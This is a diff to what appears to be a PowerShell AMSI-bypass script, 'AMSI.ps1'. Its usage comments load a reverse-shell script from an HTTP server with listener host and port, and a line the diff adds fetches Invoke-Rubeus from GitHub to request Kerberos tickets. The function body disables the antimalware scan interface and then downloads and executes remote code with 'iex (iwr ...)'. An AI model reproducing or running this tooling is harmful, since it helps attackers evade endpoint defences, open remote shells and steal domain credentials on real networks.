@@ -9,6 +9,8 @@
      import-module AMSI.ps1
      AMSI_Lines -File http://127.0.0.1:8080/revshell.ps1 -Commands "-LHOST MyIp -Port 9001"
      AMSI_Lines # This Will Execute Invoke-Rubeus By default with '-h' parameter
+     AMSI_Lines -file "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1" -Commands "invoke-rubeus asktgt"
+     
 #>
  $Win32 = @"
 using System;
@@ -46,4 +48,3 @@ sleep 2
 iex ( iwr $File -UseBasicParsing) ; iex $Commands
 };
 
-AMSI_Lines
